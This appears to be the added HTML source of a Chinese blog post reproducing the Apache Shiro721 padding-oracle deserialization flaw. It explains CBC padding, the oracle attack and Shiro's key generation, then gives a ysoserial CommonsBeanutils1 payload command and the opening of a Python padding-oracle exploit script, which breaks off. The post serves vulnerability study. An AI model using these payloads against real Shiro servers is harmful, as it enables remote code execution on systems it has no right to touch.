@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="kivvs">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kivvs.github.io/2026/10/01/shiro721反序列化漏洞复现/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro721反序列化漏洞复现">
+<meta property="og:url" content="https://kivvs.github.io/2026/10/01/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="kivvs">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kivvs.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-10-01T10:46:01.000Z">
+<meta property="article:modified_time" content="2026-10-01T10:47:57.727Z">
+<meta property="article:author" content="kivvs">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kivvs.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://tse4-mm.cn.bing.net/th/id/OIP-C.6oyfoB93i4go2KZ08GkT3AAAAA?w=189&amp;h=180&amp;c=7&amp;r=0&amp;o=7&amp;dpr=1.5&amp;pid=1.7&amp;rm=3" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://tse4-mm.cn.bing.net/th/id/OIP-C.6oyfoB93i4go2KZ08GkT3AAAAA?w=189&amp;h=180&amp;c=7&amp;r=0&amp;o=7&amp;dpr=1.5&amp;pid=1.7&amp;rm=3">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://tse4-mm.cn.bing.net/th/id/OIP-C.6oyfoB93i4go2KZ08GkT3AAAAA?w=189&h=180&c=7&r=0&o=7&dpr=1.5&pid=1.7&rm=3">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Shiro721反序列化漏洞复现 | kivvs
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kivvs.github.io","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Kivvs 个人博客","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"3084631932@qq.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                kivvs
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">28</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Shiro721反序列化漏洞复现</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="https://tse4-mm.cn.bing.net/th/id/OIP-C.6oyfoB93i4go2KZ08GkT3AAAAA?w=189&h=180&c=7&r=0&o=7&dpr=1.5&pid=1.7&rm=3">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">kivvs</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-10-01 18:46:01</span>
+        <span class="mobile">2026-10-01 18:46:01</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-10-01 18:47:57</span>
+            <span class="mobile">2026-10-01 18:47:57</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Java%E5%AD%A6%E4%B9%A0/">Java学习</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在 shiro550 中我们能够通过拿到密钥 key 值构造恶意序列化数据得到正确加密序列并将其发送给服务端，进而执行恶意指令，其主要原因就在于 COOKIE 所用的 AES 加密密钥是硬编码。但 shiro 官方在后续版本改良了代码，将 AES 密钥修改成了动态生成密钥。所以我们无法得到一个固定的 cookies 值，每一次的加密密钥都是不同的。</p>
+<h1 id="shiro721"><a href="#shiro721" class="headerlink" title="shiro721"></a>shiro721</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
+<p>虽然使用Padding Oracle Attack可以绕过密钥直接构造攻击密文，但是在进行攻击之前我们需要获取一个合法用户的Cookie。</p>
+<h2 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h2><ul>
+<li>登录网站获取合法Cookie</li>
+<li>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</li>
+<li>利用intermediary构造出恶意的反序列化密文作为Cookie</li>
+<li>使用新的Cookie请求网站执行攻击</li>
+</ul>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Shiro &lt;&#x3D; 1.4.1</p>
+<h2 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h2><p>响应包中包含字段remember&#x3D;deleteMe字段</p>
+<h1 id="Padding-Oracle-攻击"><a href="#Padding-Oracle-攻击" class="headerlink" title="Padding Oracle 攻击"></a>Padding Oracle 攻击</h1><p><strong>该漏洞存在条件如下：</strong></p>
+<blockquote>
+<ol>
+<li>攻击者获取密文，IV（初始向量，rememberMe字段的前16字节）。  </li>
+<li>修改密文并且触发解密操作，解密成功和解密失败存在差异性。</li>
+</ol>
+</blockquote>
+<h2 id="1-分组密码的填充"><a href="#1-分组密码的填充" class="headerlink" title="1. 分组密码的填充"></a>1. 分组密码的填充</h2><p>AES、DES在加密时一般会采用分组加密，将明文进行分组，常见的64bit、128bit、256bit。</p>
+<p>分组带来一个问题，就是明文不可能恰好是block的整数倍，对于不能整除剩余的部分数据就涉及到填充操作。</p>
+<p>常用的填充操作有PKCS5和PKCS7，在最后一个block中将不足的bit位数作为bit值进行填充，例如最后一个分组（block）缺少3个bit，就填充3个0x03到结尾，缺少n个bit，就填充n个0x0n。在解密时会校验明文的填充是否满足该规则，如果是以N个0x0N结束，则意味着解密操作执行成功，否则解密操作失败。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1.png"
+                     
+                ></p>
+<h2 id="2-CBC模式密码算法"><a href="#2-CBC模式密码算法" class="headerlink" title="2. CBC模式密码算法"></a>2. CBC模式密码算法</h2><p>分组密码算法有四种模式，分别是ECB、CBC、CFB和OFB，其中CBC是IPSEC的标准做法，CBC主要是引入一个初始化向量（IV）来加强密文的随机性，保证相同明文通过相同的密钥加密的结果不一样。</p>
+<p>CBC 解密过程:<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2.png"
+                     
+                ></p>
+<ol>
+<li>会将密文进行分组（按照加密采用的分组大小），前面的第一组是初始化向量，从第二组开始才是真正的密文</li>
+<li>使用加密密钥对密文的第一组进行解密，得到”中间值“</li>
+<li>将中间值和初始化向量进行异或，得到该组的明文</li>
+<li>前一块密文是后一块密文的IV，通过异或中间值，得到明文</li>
+<li>块全部解密完成后，拼接得到明文，密码算法校验明文的格式（填充格式是否正确）</li>
+<li>校验通过得到明文，校验失败得到密文</li>
+</ol>
+<p>由于初始化向量（IV）每次加密都是随机的，所以IV经常会被放在密文的前面，解密时先获取前面的IV，再对后面的密文进行解密</p>
+<h2 id="3-攻击原理"><a href="#3-攻击原理" class="headerlink" title="3.攻击原理"></a>3.攻击原理</h2><p>根据服务器会对填充错误进行报错这个关键点，我们可以构造出一个虚假的IV值来反推中间值，首先假定明文最后一位填充的是0x01，也就是上面八种填充情况中提到第 3 种情况。根据异或的特性，只有唯一的IV值与中间值异或能得到0x01，IV值最后一个字节的取值范围是 0×01~0xFF，一共255种情况。</p>
+<p>当我们持续爆破这 255 种情况，当回显得到 0x01，那么我们就能认定得到了最后一位明文。接下来就可以继续尝试，固定最后一位明文，同时爆破倒数第二位 IMV 值，当最后两位回显都能得到 0x02，那么就可以认定得到最后两位明文，就这样循环倒推，我们就能得到最终明文并进行后面的恶意 cookies 的伪造。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3.png"
+                     
+                ><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4.png"
+                     
+                ></p>
+<p>最终更详细更具体的原理可以参考文档：<a class="link"   target="_blank" rel="noopener" href="https://lingade.github.io/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" >https://lingade.github.io/2021/10/14/Padding-Oracle-Attack-Shiro-721-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h1 id="shiro721-密钥生成的分析"><a href="#shiro721-密钥生成的分析" class="headerlink" title="shiro721 密钥生成的分析"></a>shiro721 密钥生成的分析</h1><p>接下来，我们就直接进入 shiro721 的详细分析。</p>
+<p>在 shiro550 中，可以看到 key 的生成是硬编码，是固定的一个常量<code>DEFAULT_CIPHER_KEY_BYTES</code></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<pre><code>而在 shiro721 中，则改为了动态生成的密钥，利用了`generateNewKey`方法动态生成密钥，我们就无法根据上一次爆破得到的密钥进行下一次恶意 cookies 值的伪造。
+</code></pre>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = cipherService;</span><br><span class="line">        setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<pre><code>可以继续往下看到`generateNewKey`函数，![](https://kivvs.github.io/images/Shiro721反序列化漏洞复现-5.png)
+</code></pre>
+<p>初始化了一个<code>KeyGenerator</code>对象并调用<code>init()</code>方法初始化其参数，跟进看看参数是怎么被赋值的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6.png"
+                     
+                ></p>
+<p>这里调用了双参数<code>init()</code>，并且获取了一个随机数发生器<code>SecureRandom</code>。</p>
+<p>下一步调用了<code>kg.generateKey()</code>，跟到<code>engineGenerateKey()</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7.png"
+                     
+                ></p>
+<p>可见这里已经生成了一串16字节的随机序列，然后返回一个<code>SecretKeySpec</code>对象，再使用<code>getEncoded()</code>方法获取<code>key</code>密钥序列。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-8.png"
+                     
+                ></p>
+<p>至此就是Shiro721完整的密钥生成过程。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="yso-手工复现"><a href="#yso-手工复现" class="headerlink" title="yso 手工复现"></a>yso 手工复现</h2><p>抓包界面还是跟 shiro550 没什么差异</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-9.png"
+                     
+                ></p>
+<p>使用反序列化工具 ysoserial 生成Payload，利用链Payload选择 CommonsBeanutils1，生成恶意 class 文件。命令等同于（后面爆破密钥生成 payload 时间较长，亲测半个小时左右，尽量执行简单一些的命令）</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/shiro721&quot;</span> &gt; payload.class</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://kivvs.github.io/images/Shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-10.png"
+                     
+                ></p>
+<p>将 class 文件放到 shiro721 文件夹下，利用shiro_exp.py 生成恶意 payload，格式为python shiro_exp.py [url地址] [burp抓包下来的RememberMe的值] pyload.class</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> paddingoracle <span class="keyword">import</span> BadPaddingException, PaddingOracle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote, unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PadBuster</span>(<span class="title class_ inherited__">PaddingOracle</span>):</span><br><span 